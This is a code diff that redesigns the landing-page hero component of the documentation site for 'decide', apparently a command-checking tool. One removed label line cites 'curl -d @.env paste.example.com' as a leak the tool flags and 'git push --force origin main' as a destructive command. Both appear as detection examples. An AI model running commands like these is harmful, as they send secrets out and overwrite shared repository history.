@@ -1,136 +1,127 @@
 ---
-// The landing page's first screen: the headline beside a playing terminal.
-// Starlight's hero can't hold the terminal, since its image is a fixed
-// string, so this replaces it. Only the landing page has a `hero`.
+// The landing page's first screen, centred: the release line, the headline,
+// the tagline, one command to run, and where the key goes. The recordings
+// come right after it, in <RunStage> in the page body. Starlight's hero
+// can't hold the install switcher, so this replaces it. Only the landing
+// page has a `hero`.
 //
 // Keep on each Starlight upgrade: the <h1>'s id and data-page-title, and
 // the shape of `data.hero`.
-import Terminal from './Terminal.astro';
+import Install from './Install.astro';
+import plugin from '../../../plugin/.claude-plugin/plugin.json';
 
 // Starlight's PAGE_TITLE_ID, which it does not export.
 const PAGE_TITLE_ID = '_top';
 
 const { data } = Astro.locals.starlightRoute.entry;
-const { title = data.title, tagline, actions = [] } = data.hero || {};
+const { title = data.title, tagline } = data.hero || {};
+const version = `v${plugin.version}`;
+const repo = 'https://github.com/deepnoodle-ai/decide';
 ---
 
 <section class="hero">
-	<div class="lead">
-		<h1 id={PAGE_TITLE_ID} data-page-title set:html={title} />
-		{tagline && <div class="tagline" set:html={tagline} />}
-		{
-			actions.length > 0 && (
-				<div class="actions">
-					{actions.map(({ link, text, variant }) => (
-						<a class:list={['action', variant]} href={link}>
-							{text}
-							{variant === 'primary' && <span aria-hidden="true">→</span>}
-						</a>
-					))}
-				</div>
-			)
-		}
-	</div>
-	<div class="term-area">
-		<Terminal
-			tape="landing"
-			title="~/shop"
-			label="decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak"
-			compact
-		/>
-	</div>
+	{
+		data.release && (
+			<a class="release" href={`${repo}/releases/tag/${version}`}>
+				<b>{version}</b>
+				<span>{data.release} →</span>
+			</a>
+		)
+	}
+	<h1 id={PAGE_TITLE_ID} data-page-title set:html={title} />
+	{tagline && <div class="tagline" set:html={tagline} />}
+	<Install />
+	<p class="key">
+		<b>You bring the key,</b> from TypeSafe, Cloudflare, or OpenAI. decide reads it from the environment and sends only the
+		text you ask about to the provider you picked.
+	</p>
+	<a class="start" href="/start/">Read the quickstart →</a>
 </section>
 
 <style>
 	.hero {
-		display: grid;
-		grid-template-columns: minmax(0, 1fr) 620px;
-		gap: 28px 48px;
-		align-items: start;
-		padding-block: 0.5rem 1.25rem;
+		padding-block: clamp(32px, 6vw, 72px) 0;
+		text-align: center;
 	}
-	.hero > * {
-		min-width: 0;
+	.release {
+		display: inline-flex;
+		align-items: center;
+		gap: 10px;
+		max-width: 100%;
+		margin-bottom: 28px;
+		font: 400 12.5px/1.4 var(--sl-font-mono);
+		color: var(--sl-color-gray-3);
+		text-decoration: none;
 	}
-	h1 {
-		margin: 0;
-		font-size: 50px;
-		font-weight: 600;
-		line-height: 1.04;
-		letter-spacing: -0.035em;
+	.release b {
+		flex: none;
+		padding: 3px 7px;
+		border: 1px solid var(--sl-color-hairline);
+		border-radius: 6px;
+		font-weight: 400;
 		color: var(--sl-color-white);
 	}
-	.tagline :global(p) {
-		margin: 18px 0 0;
-		font-size: 18px;
-		line-height: 1.55;
-		color: var(--sl-color-gray-2);
+	.release span {
+		text-align: left;
 	}
-	.tagline :global(p.why) {
-		margin-top: 14px;
-		font-size: 15px;
+	.release:hover span {
+		color: var(--sl-color-white);
+	}
+	h1 {
+		max-width: 15ch;
+		margin: 0 auto;
+		font-size: clamp(38px, 6vw, 72px);
+		font-weight: 500;
+		line-height: 1.02;
+		letter-spacing: -0.04em;
+		color: var(--sl-color-white);
+		text-wrap: balance;
+	}
+	h1 :global(.dim) {
 		color: var(--sl-color-gray-3);
 	}
-	.tagline :global(p.why b) {
+	.tagline :global(p) {
+		max-width: 46ch;
+		margin: 24px auto 0;
+		font-size: 17px;
+		line-height: 1.55;
+		color: var(--sl-color-gray-2);
+		text-wrap: balance;
+	}
+	.key {
+		max-width: 52ch;
+		margin: 18px auto 0;
+		font-size: 13.5px;
+		line-height: 1.6;
+		color: var(--sl-color-gray-4);
+		text-wrap: balance;
+	}
+	.key b {
 		font-weight: 600;
-		color: var(--sl-color-gray-1);
+		color: var(--sl-color-gray-3);
 	}
-	.actions {
-		display: flex;
-		flex-wrap: wrap;
-		align-items: center;
-		gap: 12px 20px;
-		margin-top: 22px;
-	}
-	.action {
-		font-size: 15px;
+	/* A splash page has no menu, so the hero carries the way into the docs. */
+	.start {
+		display: inline-block;
+		margin-top: 14px;
+		font-size: 14.5px;
 		font-weight: 500;
 		color: var(--sl-color-white);
 		text-decoration: underline;
 		text-decoration-color: var(--sl-color-gray-4);
-		text-decoration-thickness: 1px;
 		text-underline-offset: 0.22em;
 	}
-	.action:hover {
+	.start:hover {
 		text-decoration-color: currentColor;
 	}
-	.action.primary {
-		display: inline-flex;
-		align-items: center;
-		gap: 8px;
-		height: 42px;
-		padding: 0 18px;
-		border-radius: 999px;
-		background: var(--sl-color-white);
-		color: var(--sl-color-black);
-		font-weight: 600;
-		text-decoration: none;
-		transition: background 120ms var(--ease);
-	}
-	.action.primary:hover {
-		background: var(--sl-color-gray-1);
-	}
-
-	@media (max-width: 1099px) {
-		.hero {
-			grid-template-columns: minmax(0, 1fr) 540px;
-			gap: 28px 36px;
+	@media (max-width: 600px) {
+		.release {
+			flex-direction: column;
+			gap: 10px;
 		}
-		h1 {
-			font-size: 44px;
-		}
-		.tagline :global(p:first-child) {
-			font-size: 17px;
-		}
-	}
-	@media (max-width: 799px) {
-		.hero {
-			grid-template-columns: minmax(0, 1fr);
-			gap: 24px;
-			padding-top: 0.5rem;
-		}
-		h1 {
-			font-size: 38px;
+		.release span {
+			text-align: center;
+			text-wrap: balance;
 		}
 	}
 </style>
